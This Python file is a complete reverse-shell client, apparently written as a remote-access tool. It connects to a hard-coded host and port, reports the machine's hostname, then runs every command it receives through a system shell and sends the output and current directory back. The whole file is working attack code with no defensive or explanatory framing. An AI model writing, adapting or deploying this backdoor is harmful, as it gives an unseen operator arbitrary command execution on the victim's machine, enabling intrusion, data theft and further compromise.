import socket
import sys
import os 
import subprocess

class Client(object):

    def __init__(self):
        self.host = '192.168.1.115'
        self.port = 9999
        self.socket = None
    

    def create_socket(self):
        self.socket = socket.socket()
        self.socket.connect((self.host,self.port))
        hostname = socket.gethostname()
        self.socket.send(hostname.encode())
        self.receive_commands()


    def receive_commands(self):
        while 1:
            data = self.socket.recv(1024)
            cmd = data.decode('utf-8')

            if cmd == 'join':
                cwd = str(os.getcwd()) + '>'
                self.socket.send(str.encode(cwd))
                continue

            if(cmd == 'quit'):
                break

            sp = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = sp.stdout.read() + sp.stderr.read()
            output_str = str(output_bytes, "utf-8")
            self.socket.send(str.encode(output_str + str(os.getcwd()) + '>'))
            print(output_str)

        self.socket.close
            

def main():
    client = Client()
    client.create_socket()


main()